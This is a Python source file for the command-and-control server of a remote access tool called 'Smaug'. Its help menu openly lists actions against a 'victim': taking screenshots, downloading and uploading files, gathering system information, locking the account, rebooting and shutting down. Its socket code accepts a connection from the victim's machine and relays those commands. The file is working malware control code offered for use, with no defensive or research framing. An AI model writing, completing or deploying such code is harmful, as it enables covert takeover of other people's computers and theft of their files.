#!/usr/bin
# Made by p3rpl3x
import os
import json
import time
import base64
import socket
from colorama import Fore

host = "localhost"
port = 42069

# ============================================================================================================================ #


# ============================================================================================================================ #

banner = f"""{Fore.LIGHTRED_EX}
    
                    ,'\   |\\
               / /.:  ;;
              / :'|| //
             (| | ||;'
             / ||,;'-.._
            : ,;,`';:.--`
            |:|'`-(\\\\
            ::: \-'\`'
             \\\\ \,-`.
              `'\ `.,-`-._      ,-._
       ,-.       \  `.,-' `-.  / ,..`.
      / ,.`.      `.  \ _.-' \\',: ``\ \\
     / / :..`-'''``-)  `.   _.:''  ''\ \\
    : :  '' `-..''`/    |-''  |''  '' \ \\
    | |  ''   ''  :     |__..-;''  ''  : :           >> {Fore.LIGHTBLACK_EX}Smaug {Fore.GREEN}v1.0 {Fore.LIGHTRED_EX}
    | |  ''   ''  |     ;    / ''  ''  | |           >> {Fore.LIGHTBLACK_EX}Type {Fore.GREEN}'help'{Fore.LIGHTBLACK_EX} to see all available Commands{Fore.LIGHTRED_EX}
    | |  ''   ''  ;    /--../_ ''_ '' _| |           >> {Fore.LIGHTBLACK_EX}Developed by {Fore.GREEN}gokiimax {Fore.LIGHTRED_EX}
    | |  ''  _;:_/    :._  /-.'',-.'',-. |           
    : :  '',;'`;/     |_ ,(   `'   `'   \|
     \ \  \(   /\     :,'  \\
      \ \.'/  : /    ,)    /
       \ ':   ':    / \   :
        `.\    :   :\  \  |
                \  | `. \ |..-_
                 ) |.  `/___-.-`
               ,'  -.'.  `. `'        _,)
               \\'\(`.\ `._ `-..___..-','
                  `'      ``-..___..-'
"""

# ============================================================================================================================ #

class Utils:

    def clear():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
            
    def clear_command():
        if os.name == 'nt':
            os.system('cls')
            print(banner)
        else:
            os.system('clear')
            print(banner)

    def help_command():
        commands = [
            ['help        ', 'Show all available commands'],
            ['cd          ', 'Change the current directory'],
            ['turnmonoff  ', 'Turn the victims Monitor off'],
            ['turnmonon   ', 'Turn the victims Monitor on'],
            ['checkadmin  ', 'Check if the victim has admin Privileges'],
            ['localtime   ', 'See the victims localtime'],
            ['clear       ', 'Clear the console'],
            ['reboot      ', 'Reboot the victims pc'],
            ['shutdown    ', 'Shutdown the victims pc'],
            ['lock        ', 'Lock the victims account!'],
            ['screenshot ', 'Take a screenshot from the victims PC'],
            ['download   ', 'Download files from the victims PC'],
            ['upload     ', 'Upload files to the victims PC'],
            ['sysinfo    ', 'Shows Information about the victims PC'],
            ['exit       ', 'Exit the application from both sites']
        ]

        index = 0
        print("\n")
        print("\t╭─────────────────╮")
        for command in commands:
            print(f"\t│ [{index}] {command[0]}│ >> {command[1]}")
            index += 1
        print("\t╰─────────────────╯")

# ============================================================================================================================ #

class Server:

    def __init__(self, ip, port):
        # Setup socket server and bind ip and the port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0) # Listen for incoming connections

        Utils.clear()
        print(banner)

        print(f"[+] Now listening on port {port}!")
        self.connection, self.address = server.accept() # Accept incoming connection
        
        Utils.clear()
        print(banner)

        self.username = self.data_receive()
        print(f"[+] Connected To {str(self.username)}@{str(self.address[0])}")

# ============================================================================================================================ #

    def data_receive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

# ============================================================================================================================ #

    def data_send(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

# ============================================================================================================================ #

    def execute_remotely(self, command):
        self.data_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit(-1)
        return self.data_receive()

# ============================================================================================================================ #

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

# ============================================================================================================================ #

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download completed!"

# ============================================================================================================================ #

    def handle_result(self, result):
        if "[-]" in result:
            return "\n" + Fore.RED + result + Fore.RESET + "\n"
        elif "[+]" in result:
            return "\n" + Fore.GREEN + result + Fore.RESET + "\n"
        else:
            return "\n" + Fore.RESET + result + Fore.RESET + "\n"

# ============================================================================================================================ #

    def run(self):
        while True:
            # Handle Command input
            command = input(f"{Fore.LIGHTRED_EX}╭── {Fore.WHITE}[{Fore.LIGHTRED_EX}Smaug@{self.address[0]}{Fore.WHITE}]\n{Fore.LIGHTRED_EX}╰──────# {Fore.RESET}")
            command = command.split(" ", 1)

            try:
                if command[0] == "upload":
                    fileContent = self.read_file(command[1]).decode()
                    command.append(fileContent)

                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)

                elif command[0] == "help":
                    Utils.help_command()

                elif command[0] == "clear":
                    Utils.clear_command()
            except Exception:
                result = "[-] Error running command, check the syntax of the command."
            print(self.handle_result(result=result))

# ============================================================================================================================ #

def main():
    Utils.clear()
    print(banner)

    # Start the server
    activeServer = Server(host, port)
    activeServer.run()

main()
